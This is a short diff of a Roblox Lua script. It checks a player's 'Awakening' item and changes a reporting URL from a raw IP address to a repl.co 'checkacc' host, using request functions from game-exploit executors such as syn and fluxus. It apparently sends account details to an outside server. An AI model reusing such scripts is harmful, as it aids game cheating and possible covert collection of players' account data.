@@ -35,7 +35,7 @@ if plr.Backpack:FindFirstChild("Awakening") or plr.Character:FindFirstChild("Awa
     race = " V4"
 end
 
-local url = 'http://1.53.193.50:3000/layfile'
+local url = 'https://checkacc.braventran.repl.co/layfile'
 
 local Request = (syn and syn.request) or (http and http.request) or http_request or (fluxus and fluxus.request) or request
 
